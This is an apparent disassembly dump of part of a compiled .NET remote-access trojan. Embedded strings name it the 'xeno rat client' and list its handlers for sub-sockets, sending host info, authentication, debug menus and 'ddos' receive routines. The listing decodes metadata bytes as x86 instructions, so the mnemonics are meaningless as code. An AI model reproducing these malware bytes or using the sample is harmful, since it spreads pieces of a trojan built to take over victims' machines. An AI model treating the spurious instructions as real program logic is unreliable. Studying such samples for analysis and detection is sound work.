  40ca73:	00 67 00             	add    %ah,0x0(%edi)
  40ca76:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ca7a:	07                   	pop    %es
  40ca7b:	00 00                	add    %al,(%eax)
  40ca7d:	15 12 39 01 09       	adc    $0x9013912,%eax
  40ca82:	03 00                	add    (%eax),%eax
  40ca84:	00 09                	add    %cl,(%ecx)
  40ca86:	02 06                	add    (%esi),%al
  40ca88:	09 04 06             	or     %eax,(%esi,%eax,1)
  40ca8b:	12 80 84 06 06 15    	adc    0x15060684(%eax),%al
  40ca91:	12 65 01             	adc    0x1(%ebp),%ah
  40ca94:	0e                   	push   %cs
  40ca95:	06                   	push   %es
  40ca96:	06                   	push   %es
  40ca97:	15 12 65 01 09       	adc    $0x9016512,%eax
  40ca9c:	03 20                	add    (%eax),%esp
  40ca9e:	00 09                	add    %cl,(%ecx)
  40caa0:	06                   	push   %es
  40caa1:	06                   	push   %es
  40caa2:	15 11 41 01 0e       	adc    $0xe014111,%eax
  40caa7:	03 06                	add    (%esi),%eax
  40caa9:	12 69 06             	adc    0x6(%ecx),%ch
  40caac:	06                   	push   %es
  40caad:	15 11 41 01 09       	adc    $0x9014111,%eax
  40cab2:	04 06                	add    $0x6,%al
  40cab4:	11 80 b0 04 06 11    	adc    %eax,0x110604b0(%eax)
  40caba:	80 b4 08 01 00 08 00 	xorb   $0x0,0x80001(%eax,%ecx,1)
  40cac1:	00 
  40cac2:	00 00                	add    %al,(%eax)
  40cac4:	00 1e                	add    %bl,(%esi)
  40cac6:	01 00                	add    %eax,(%eax)
  40cac8:	01 00                	add    %eax,(%eax)
  40caca:	54                   	push   %esp
  40cacb:	02 16                	add    (%esi),%dl
  40cacd:	57                   	push   %edi
  40cace:	72 61                	jb     0x40cb31
  40cad0:	70 4e                	jo     0x40cb20
  40cad2:	6f                   	outsl  %ds:(%esi),(%dx)
  40cad3:	6e                   	outsb  %ds:(%esi),(%dx)
  40cad4:	45                   	inc    %ebp
  40cad5:	78 63                	js     0x40cb3a
  40cad7:	65 70 74             	gs jo  0x40cb4e
  40cada:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40cae1:	77 73                	ja     0x40cb56
  40cae3:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cae9:	79 08                	jns    0x40caf3
  40caeb:	01 00                	add    %eax,(%eax)
  40caed:	02 00                	add    (%eax),%al
  40caef:	00 00                	add    %al,(%eax)
  40caf1:	00 00                	add    %al,(%eax)
  40caf3:	0a 01                	or     (%ecx),%al
  40caf5:	00 05 65 64 52 41    	add    %al,0x41526465
  40cafb:	54                   	push   %esp
  40cafc:	00 00                	add    %al,(%eax)
  40cafe:	05 01 00 00 00       	add    $0x1,%eax
  40cb03:	00 14 01             	add    %dl,(%ecx,%eax,1)
  40cb06:	00 0f                	add    %cl,(%edi)
  40cb08:	78 65                	js     0x40cb6f
  40cb0a:	6e                   	outsb  %ds:(%esi),(%dx)
  40cb0b:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb0c:	20 72 61             	and    %dh,0x61(%edx)
  40cb0f:	74 20                	je     0x40cb31
  40cb11:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cb15:	6e                   	outsb  %ds:(%esi),(%dx)
  40cb16:	74 00                	je     0x40cb18
  40cb18:	00 17                	add    %dl,(%edi)
  40cb1a:	01 00                	add    %eax,(%eax)
  40cb1c:	12 43 6f             	adc    0x6f(%ebx),%al
  40cb1f:	70 79                	jo     0x40cb9a
  40cb21:	72 69                	jb     0x40cb8c
  40cb23:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40cb29:	20 20                	and    %ah,(%eax)
  40cb2b:	32 30                	xor    (%eax),%dh
  40cb2d:	32 33                	xor    (%ebx),%dh
  40cb2f:	00 00                	add    %al,(%eax)
  40cb31:	04 20                	add    $0x20,%al
  40cb33:	01 01                	add    %eax,(%ecx)
  40cb35:	02 29                	add    (%ecx),%ch
  40cb37:	01 00                	add    %eax,(%eax)
  40cb39:	24 33                	and    $0x33,%al
  40cb3b:	31 30                	xor    %esi,(%eax)
  40cb3d:	66 63 35 62 65 2d 36 	arpl   %si,0x362d6562
  40cb44:	66 35 65 2d          	xor    $0x2d65,%ax
  40cb48:	34 37                	xor    $0x37,%al
  40cb4a:	39 63 2d             	cmp    %esp,0x2d(%ebx)
  40cb4d:	61                   	popa
  40cb4e:	32 34 36             	xor    (%esi,%esi,1),%dh
  40cb51:	2d 36 30 39 33       	sub    $0x33393036,%eax
  40cb56:	61                   	popa
  40cb57:	33 39                	xor    (%ecx),%edi
  40cb59:	32 39                	xor    (%ecx),%bh
  40cb5b:	36 63 30             	arpl   %esi,%ss:(%eax)
  40cb5e:	00 00                	add    %al,(%eax)
  40cb60:	0c 01                	or     $0x1,%al
  40cb62:	00 07                	add    %al,(%edi)
  40cb64:	31 2e                	xor    %ebp,(%esi)
  40cb66:	30 2e                	xor    %ch,(%esi)
  40cb68:	30 2e                	xor    %ch,(%esi)
  40cb6a:	30 00                	xor    %al,(%eax)
  40cb6c:	00 49 01             	add    %cl,0x1(%ecx)
  40cb6f:	00 1a                	add    %bl,(%edx)
  40cb71:	2e 4e                	cs dec %esi
  40cb73:	45                   	inc    %ebp
  40cb74:	54                   	push   %esp
  40cb75:	46                   	inc    %esi
  40cb76:	72 61                	jb     0x40cbd9
  40cb78:	6d                   	insl   (%dx),%es:(%edi)
  40cb79:	65 77 6f             	gs ja  0x40cbeb
  40cb7c:	72 6b                	jb     0x40cbe9
  40cb7e:	2c 56                	sub    $0x56,%al
  40cb80:	65 72 73             	gs jb  0x40cbf6
  40cb83:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cb8a:	38 01                	cmp    %al,(%ecx)
  40cb8c:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40cb90:	46                   	inc    %esi
  40cb91:	72 61                	jb     0x40cbf4
  40cb93:	6d                   	insl   (%dx),%es:(%edi)
  40cb94:	65 77 6f             	gs ja  0x40cc06
  40cb97:	72 6b                	jb     0x40cc04
  40cb99:	44                   	inc    %esp
  40cb9a:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cba1:	61                   	popa
  40cba2:	6d                   	insl   (%dx),%es:(%edi)
  40cba3:	65 12 2e             	adc    %gs:(%esi),%ch
  40cba6:	4e                   	dec    %esi
  40cba7:	45                   	inc    %ebp
  40cba8:	54                   	push   %esp
  40cba9:	20 46 72             	and    %al,0x72(%esi)
  40cbac:	61                   	popa
  40cbad:	6d                   	insl   (%dx),%es:(%edi)
  40cbae:	65 77 6f             	gs ja  0x40cc20
  40cbb1:	72 6b                	jb     0x40cc1e
  40cbb3:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40cbb6:	38 06                	cmp    %al,(%esi)
  40cbb8:	20 01                	and    %al,(%ecx)
  40cbba:	01 12                	add    %edx,(%edx)
  40cbbc:	80 ad 34 01 00 2f 78 	subb   $0x78,0x2f000134(%ebp)
  40cbc3:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cbc5:	6f                   	outsl  %ds:(%esi),(%dx)
  40cbc6:	5f                   	pop    %edi
  40cbc7:	72 61                	jb     0x40cc2a
  40cbc9:	74 5f                	je     0x40cc2a
  40cbcb:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cbcf:	6e                   	outsb  %ds:(%esi),(%dx)
  40cbd0:	74 2e                	je     0x40cc00
  40cbd2:	44                   	inc    %esp
  40cbd3:	6c                   	insb   (%dx),%es:(%edi)
  40cbd4:	6c                   	insb   (%dx),%es:(%edi)
  40cbd5:	48                   	dec    %eax
  40cbd6:	61                   	popa
  40cbd7:	6e                   	outsb  %ds:(%esi),(%dx)
  40cbd8:	64 6c                	fs insb (%dx),%es:(%edi)
  40cbda:	65 72 2b             	gs jb  0x40cc08
  40cbdd:	3c 44                	cmp    $0x44,%al
  40cbdf:	6c                   	insb   (%dx),%es:(%edi)
  40cbe0:	6c                   	insb   (%dx),%es:(%edi)
  40cbe1:	4e                   	dec    %esi
  40cbe2:	6f                   	outsl  %ds:(%esi),(%dx)
  40cbe3:	64 65 48             	fs gs dec %eax
  40cbe6:	61                   	popa
  40cbe7:	6e                   	outsb  %ds:(%esi),(%dx)
  40cbe8:	64 6c                	fs insb (%dx),%es:(%edi)
  40cbea:	65 72 3e             	gs jb  0x40cc2b
  40cbed:	64 5f                	fs pop %edi
  40cbef:	5f                   	pop    %edi
  40cbf0:	33 00                	xor    (%eax),%eax
  40cbf2:	00 04 01             	add    %al,(%ecx,%eax,1)
  40cbf5:	00 00                	add    %al,(%eax)
  40cbf7:	00 30                	add    %dh,(%eax)
  40cbf9:	01 00                	add    %eax,(%eax)
  40cbfb:	2b 78 65             	sub    0x65(%eax),%edi
  40cbfe:	6e                   	outsb  %ds:(%esi),(%dx)
  40cbff:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc00:	5f                   	pop    %edi
  40cc01:	72 61                	jb     0x40cc64
  40cc03:	74 5f                	je     0x40cc64
  40cc05:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cc09:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc0a:	74 2e                	je     0x40cc3a
  40cc0c:	48                   	dec    %eax
  40cc0d:	61                   	popa
  40cc0e:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc0f:	64 6c                	fs insb (%dx),%es:(%edi)
  40cc11:	65 72 2b             	gs jb  0x40cc3f
  40cc14:	3c 43                	cmp    $0x43,%al
  40cc16:	72 65                	jb     0x40cc7d
  40cc18:	61                   	popa
  40cc19:	74 65                	je     0x40cc80
  40cc1b:	53                   	push   %ebx
  40cc1c:	75 62                	jne    0x40cc80
  40cc1e:	53                   	push   %ebx
  40cc1f:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc20:	63 6b 3e             	arpl   %ebp,0x3e(%ebx)
  40cc23:	64 5f                	fs pop %edi
  40cc25:	5f                   	pop    %edi
  40cc26:	33 00                	xor    (%eax),%eax
  40cc28:	00 31                	add    %dh,(%ecx)
  40cc2a:	01 00                	add    %eax,(%eax)
  40cc2c:	2c 78                	sub    $0x78,%al
  40cc2e:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cc30:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc31:	5f                   	pop    %edi
  40cc32:	72 61                	jb     0x40cc95
  40cc34:	74 5f                	je     0x40cc95
  40cc36:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cc3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc3b:	74 2e                	je     0x40cc6b
  40cc3d:	48                   	dec    %eax
  40cc3e:	61                   	popa
  40cc3f:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc40:	64 6c                	fs insb (%dx),%es:(%edi)
  40cc42:	65 72 2b             	gs jb  0x40cc70
  40cc45:	3c 47                	cmp    $0x47,%al
  40cc47:	65 74 41             	gs je  0x40cc8b
  40cc4a:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc4b:	64 53                	fs push %ebx
  40cc4d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cc4f:	64 49                	fs dec %ecx
  40cc51:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc52:	66 6f                	outsw  %ds:(%esi),(%dx)
  40cc54:	3e 64 5f             	ds fs pop %edi
  40cc57:	5f                   	pop    %edi
  40cc58:	35 00 00 2f 01       	xor    $0x12f0000,%eax
  40cc5d:	00 2a                	add    %ch,(%edx)
  40cc5f:	78 65                	js     0x40ccc6
  40cc61:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc62:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc63:	5f                   	pop    %edi
  40cc64:	72 61                	jb     0x40ccc7
  40cc66:	74 5f                	je     0x40ccc7
  40cc68:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cc6c:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc6d:	74 2e                	je     0x40cc9d
  40cc6f:	48                   	dec    %eax
  40cc70:	61                   	popa
  40cc71:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc72:	64 6c                	fs insb (%dx),%es:(%edi)
  40cc74:	65 72 2b             	gs jb  0x40cca2
  40cc77:	3c 54                	cmp    $0x54,%al
  40cc79:	79 70                	jns    0x40cceb
  40cc7b:	65 30 52 65          	xor    %dl,%gs:0x65(%edx)
  40cc7f:	63 65 69             	arpl   %esp,0x69(%ebp)
  40cc82:	76 65                	jbe    0x40cce9
  40cc84:	3e 64 5f             	ds fs pop %edi
  40cc87:	5f                   	pop    %edi
  40cc88:	36 00 00             	add    %al,%ss:(%eax)
  40cc8b:	2f                   	das
  40cc8c:	01 00                	add    %eax,(%eax)
  40cc8e:	2a 78 65             	sub    0x65(%eax),%bh
  40cc91:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc92:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc93:	5f                   	pop    %edi
  40cc94:	72 61                	jb     0x40ccf7
  40cc96:	74 5f                	je     0x40ccf7
  40cc98:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cc9c:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc9d:	74 2e                	je     0x40cccd
  40cc9f:	48                   	dec    %eax
  40cca0:	61                   	popa
  40cca1:	6e                   	outsb  %ds:(%esi),(%dx)
  40cca2:	64 6c                	fs insb (%dx),%es:(%edi)
  40cca4:	65 72 2b             	gs jb  0x40ccd2
  40cca7:	3c 54                	cmp    $0x54,%al
  40cca9:	79 70                	jns    0x40cd1b
  40ccab:	65 31 52 65          	xor    %edx,%gs:0x65(%edx)
  40ccaf:	63 65 69             	arpl   %esp,0x69(%ebp)
  40ccb2:	76 65                	jbe    0x40cd19
  40ccb4:	3e 64 5f             	ds fs pop %edi
  40ccb7:	5f                   	pop    %edi
  40ccb8:	37                   	aaa
  40ccb9:	00 00                	add    %al,(%eax)
  40ccbb:	2b 01                	sub    (%ecx),%eax
  40ccbd:	00 26                	add    %ah,(%esi)
  40ccbf:	78 65                	js     0x40cd26
  40ccc1:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccc2:	6f                   	outsl  %ds:(%esi),(%dx)
  40ccc3:	5f                   	pop    %edi
  40ccc4:	72 61                	jb     0x40cd27
  40ccc6:	74 5f                	je     0x40cd27
  40ccc8:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cccc:	6e                   	outsb  %ds:(%esi),(%dx)
  40cccd:	74 2e                	je     0x40ccfd
  40cccf:	48                   	dec    %eax
  40ccd0:	61                   	popa
  40ccd1:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccd2:	64 6c                	fs insb (%dx),%es:(%edi)
  40ccd4:	65 72 2b             	gs jb  0x40cd02
  40ccd7:	3c 73                	cmp    $0x73,%al
  40ccd9:	65 74 53             	gs je  0x40cd2f
  40ccdc:	65 74 49             	gs je  0x40cd28
  40ccdf:	64 3e 64 5f          	fs ds fs pop %edi
  40cce3:	5f                   	pop    %edi
  40cce4:	38 00                	cmp    %al,(%eax)
  40cce6:	00 2f                	add    %ch,(%edi)
  40cce8:	01 00                	add    %eax,(%eax)
  40ccea:	2a 78 65             	sub    0x65(%eax),%bh
  40cced:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccee:	6f                   	outsl  %ds:(%esi),(%dx)
  40ccef:	5f                   	pop    %edi
  40ccf0:	72 61                	jb     0x40cd53
  40ccf2:	74 5f                	je     0x40cd53
  40ccf4:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40ccf8:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccf9:	74 2e                	je     0x40cd29
  40ccfb:	48                   	dec    %eax
  40ccfc:	61                   	popa
  40ccfd:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccfe:	64 6c                	fs insb (%dx),%es:(%edi)
  40cd00:	65 72 2b             	gs jb  0x40cd2e
  40cd03:	3c 54                	cmp    $0x54,%al
  40cd05:	79 70                	jns    0x40cd77
  40cd07:	65 32 52 65          	xor    %gs:0x65(%edx),%dl
  40cd0b:	63 65 69             	arpl   %esp,0x69(%ebp)
  40cd0e:	76 65                	jbe    0x40cd75
  40cd10:	3e 64 5f             	ds fs pop %edi
  40cd13:	5f                   	pop    %edi
  40cd14:	39 00                	cmp    %eax,(%eax)
  40cd16:	00 2d 01 00 28 78    	add    %ch,0x78280001
  40cd1c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cd1e:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd1f:	5f                   	pop    %edi
  40cd20:	72 61                	jb     0x40cd83
  40cd22:	74 5f                	je     0x40cd83
  40cd24:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cd28:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd29:	74 2e                	je     0x40cd59
  40cd2b:	48                   	dec    %eax
  40cd2c:	61                   	popa
  40cd2d:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd2e:	64 6c                	fs insb (%dx),%es:(%edi)
  40cd30:	65 72 2b             	gs jb  0x40cd5e
  40cd33:	3c 44                	cmp    $0x44,%al
  40cd35:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40cd39:	4d                   	dec    %ebp
  40cd3a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cd3c:	75 3e                	jne    0x40cd7c
  40cd3e:	64 5f                	fs pop %edi
  40cd40:	5f                   	pop    %edi
  40cd41:	31 30                	xor    %esi,(%eax)
  40cd43:	00 00                	add    %al,(%eax)
  40cd45:	32 01                	xor    (%ecx),%al
  40cd47:	00 2d 78 65 6e 6f    	add    %ch,0x6f6e6578
  40cd4d:	5f                   	pop    %edi
  40cd4e:	72 61                	jb     0x40cdb1
  40cd50:	74 5f                	je     0x40cdb1
  40cd52:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cd56:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd57:	74 2e                	je     0x40cd87
  40cd59:	48                   	dec    %eax
  40cd5a:	61                   	popa
  40cd5b:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd5c:	64 6c                	fs insb (%dx),%es:(%edi)
  40cd5e:	65 72 2b             	gs jb  0x40cd8c
  40cd61:	3c 53                	cmp    $0x53,%al
  40cd63:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cd65:	64 55                	fs push %ebp
  40cd67:	70 64                	jo     0x40cdcd
  40cd69:	61                   	popa
  40cd6a:	74 65                	je     0x40cdd1
  40cd6c:	49                   	dec    %ecx
  40cd6d:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd6e:	66 6f                	outsw  %ds:(%esi),(%dx)
  40cd70:	3e 64 5f             	ds fs pop %edi
  40cd73:	5f                   	pop    %edi
  40cd74:	31 31                	xor    %esi,(%ecx)
  40cd76:	00 00                	add    %al,(%eax)
  40cd78:	2b 01                	sub    (%ecx),%eax
  40cd7a:	00 26                	add    %ah,(%esi)
  40cd7c:	78 65                	js     0x40cde3
  40cd7e:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd7f:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd80:	5f                   	pop    %edi
  40cd81:	72 61                	jb     0x40cde4
  40cd83:	74 5f                	je     0x40cde4
  40cd85:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cd89:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd8a:	74 2e                	je     0x40cdba
  40cd8c:	4e                   	dec    %esi
  40cd8d:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd8e:	64 65 2b 3c 44       	fs sub %gs:(%esp,%eax,2),%edi
  40cd93:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40cd9a:	63 74 3e 64          	arpl   %esi,0x64(%esi,%edi,1)
  40cd9e:	5f                   	pop    %edi
  40cd9f:	5f                   	pop    %edi
  40cda0:	31 30                	xor    %esi,(%eax)
  40cda2:	00 00                	add    %al,(%eax)
  40cda4:	34 01                	xor    $0x1,%al
  40cda6:	00 2f                	add    %ch,(%edi)
  40cda8:	78 65                	js     0x40ce0f
  40cdaa:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdab:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdac:	5f                   	pop    %edi
  40cdad:	72 61                	jb     0x40ce10
  40cdaf:	74 5f                	je     0x40ce10
  40cdb1:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cdb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdb6:	74 2e                	je     0x40cde6
  40cdb8:	4e                   	dec    %esi
  40cdb9:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdba:	64 65 2b 3c 43       	fs sub %gs:(%ebx,%eax,2),%edi
  40cdbf:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdc0:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdc1:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdc2:	65 63 74 53 75       	arpl   %esi,%gs:0x75(%ebx,%edx,2)
  40cdc7:	62 53 6f             	bound  %edx,0x6f(%ebx)
  40cdca:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40cdcd:	73 79                	jae    0x40ce48
  40cdcf:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdd0:	63 3e                	arpl   %edi,(%esi)
  40cdd2:	64 5f                	fs pop %edi
  40cdd4:	5f                   	pop    %edi
  40cdd5:	31 31                	xor    %esi,(%ecx)
  40cdd7:	00 00                	add    %al,(%eax)
  40cdd9:	2d 01 00 28 78       	sub    $0x78280001,%eax
  40cdde:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cde0:	6f                   	outsl  %ds:(%esi),(%dx)
  40cde1:	5f                   	pop    %edi
  40cde2:	72 61                	jb     0x40ce45
  40cde4:	74 5f                	je     0x40ce45
  40cde6:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cdea:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdeb:	74 2e                	je     0x40ce1b
  40cded:	4e                   	dec    %esi
  40cdee:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdef:	64 65 2b 3c 52       	fs sub %gs:(%edx,%edx,2),%edi
  40cdf4:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40cdf8:	76 65                	jbe    0x40ce5f
  40cdfa:	41                   	inc    %ecx
  40cdfb:	73 79                	jae    0x40ce76
  40cdfd:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdfe:	63 3e                	arpl   %edi,(%esi)
  40ce00:	64 5f                	fs pop %edi
  40ce02:	5f                   	pop    %edi
  40ce03:	31 33                	xor    %esi,(%ebx)
  40ce05:	00 00                	add    %al,(%eax)
  40ce07:	2a 01                	sub    (%ecx),%al
  40ce09:	00 25 78 65 6e 6f    	add    %ah,0x6f6e6578
  40ce0f:	5f                   	pop    %edi
  40ce10:	72 61                	jb     0x40ce73
  40ce12:	74 5f                	je     0x40ce73
  40ce14:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40ce18:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce19:	74 2e                	je     0x40ce49
  40ce1b:	4e                   	dec    %esi
  40ce1c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ce1d:	64 65 2b 3c 53       	fs sub %gs:(%ebx,%edx,2),%edi
  40ce22:	65 6e                	outsb  %gs:(%esi),(%dx)
  40ce24:	64 41                	fs inc %ecx
  40ce26:	73 79                	jae    0x40cea1
  40ce28:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce29:	63 3e                	arpl   %edi,(%esi)
  40ce2b:	64 5f                	fs pop %edi
  40ce2d:	5f                   	pop    %edi
  40ce2e:	31 34 00             	xor    %esi,(%eax,%eax,1)
  40ce31:	00 32                	add    %dh,(%edx)
  40ce33:	01 00                	add    %eax,(%eax)
  40ce35:	2d 78 65 6e 6f       	sub    $0x6f6e6578,%eax
  40ce3a:	5f                   	pop    %edi
  40ce3b:	72 61                	jb     0x40ce9e
  40ce3d:	74 5f                	je     0x40ce9e
  40ce3f:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40ce43:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce44:	74 2e                	je     0x40ce74
  40ce46:	4e                   	dec    %esi
  40ce47:	6f                   	outsl  %ds:(%esi),(%dx)
  40ce48:	64 65 2b 3c 41       	fs sub %gs:(%ecx,%eax,2),%edi
  40ce4d:	75 74                	jne    0x40cec3
  40ce4f:	68 65 6e 74 69       	push   $0x69746e65
  40ce54:	63 61 74             	arpl   %esp,0x74(%ecx)
  40ce57:	65 41                	gs inc %ecx
  40ce59:	73 79                	jae    0x40ced4
  40ce5b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce5c:	63 3e                	arpl   %edi,(%esi)
  40ce5e:	64 5f                	fs pop %edi
  40ce60:	5f                   	pop    %edi
  40ce61:	31 38                	xor    %edi,(%eax)
  40ce63:	00 00                	add    %al,(%eax)
  40ce65:	42                   	inc    %edx
  40ce66:	01 00                	add    %eax,(%eax)
  40ce68:	3d 78 65 6e 6f       	cmp    $0x6f6e6578,%eax
  40ce6d:	5f                   	pop    %edi
  40ce6e:	72 61                	jb     0x40ced1
  40ce70:	74 5f                	je     0x40ced1
  40ce72:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40ce76:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce77:	74 2e                	je     0x40cea7
  40ce79:	53                   	push   %ebx
  40ce7a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ce7b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40ce7e:	74 48                	je     0x40cec8
  40ce80:	61                   	popa
  40ce81:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce82:	64 6c                	fs insb (%dx),%es:(%edi)
  40ce84:	65 72 2b             	gs jb  0x40ceb2
  40ce87:	3c 52                	cmp    $0x52,%al
  40ce89:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40ce8d:	6c                   	insb   (%dx),%es:(%edi)
  40ce8e:	6c                   	insb   (%dx),%es:(%edi)
  40ce8f:	41                   	inc    %ecx
  40ce90:	73 79                	jae    0x40cf0b
  40ce92:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce93:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40ce96:	64 6f                	outsl  %fs:(%esi),(%dx)
  40ce98:	73 5f                	jae    0x40cef9
  40ce9a:	75 6e                	jne    0x40cf0a
  40ce9c:	73 61                	jae    0x40ceff
  40ce9e:	66 65 72 3e          	data16 gs jb 0x40cee0
  40cea2:	64 5f                	fs pop %edi
  40cea4:	5f                   	pop    %edi
  40cea5:	34 00                	xor    $0x0,%al
  40cea7:	00 40 01             	add    %al,0x1(%eax)
  40ceaa:	00 3b                	add    %bh,(%ebx)
  40ceac:	78 65                	js     0x40cf13
  40ceae:	6e                   	outsb  %ds:(%esi),(%dx)
  40ceaf:	6f                   	outsl  %ds:(%esi),(%dx)
  40ceb0:	5f                   	pop    %edi
  40ceb1:	72 61                	jb     0x40cf14
  40ceb3:	74 5f                	je     0x40cf14
  40ceb5:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40ceb9:	6e                   	outsb  %ds:(%esi),(%dx)
  40ceba:	74 2e                	je     0x40ceea
  40cebc:	53                   	push   %ebx
  40cebd:	6f                   	outsl  %ds:(%esi),(%dx)
  40cebe:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40cec1:	74 48                	je     0x40cf0b
  40cec3:	61                   	popa
  40cec4:	6e                   	outsb  %ds:(%esi),(%dx)
  40cec5:	64 6c                	fs insb (%dx),%es:(%edi)
  40cec7:	65 72 2b             	gs jb  0x40cef5
  40ceca:	3c 52                	cmp    $0x52,%al
  40cecc:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40ced0:	6c                   	insb   (%dx),%es:(%edi)
  40ced1:	6c                   	insb   (%dx),%es:(%edi)
  40ced2:	41                   	inc    %ecx
  40ced3:	73 79                	jae    0x40cf4e
  40ced5:	6e                   	outsb  %ds:(%esi),(%dx)
  40ced6:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40ced9:	64 6f                	outsl  %fs:(%esi),(%dx)
  40cedb:	73 5f                	jae    0x40cf3c
  40cedd:	73 61                	jae    0x40cf40
  40cedf:	66 65 72 3e          	data16 gs jb 0x40cf21
  40cee3:	64 5f                	fs pop %edi
  40cee5:	5f                   	pop    %edi
  40cee6:	35 00 00 32 01       	xor    $0x1320000,%eax
  40ceeb:	00 2d 78 65 6e 6f    	add    %ch,0x6f6e6578
  40cef1:	5f                   	pop    %edi
  40cef2:	72 61                	jb     0x40cf55
  40cef4:	74 5f                	je     0x40cf55
  40cef6:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cefa:	6e                   	outsb  %ds:(%esi),(%dx)
  40cefb:	74 2e                	je     0x40cf2b
  40cefd:	53                   	push   %ebx
  40cefe:	6f                   	outsl  %ds:(%esi),(%dx)
  40ceff:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40cf02:	74 48                	je     0x40cf4c
  40cf04:	61                   	popa
  40cf05:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf06:	64 6c                	fs insb (%dx),%es:(%edi)
  40cf08:	65 72 2b             	gs jb  0x40cf36
  40cf0b:	3c 53                	cmp    $0x53,%al
  40cf0d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cf0f:	64 41                	fs inc %ecx
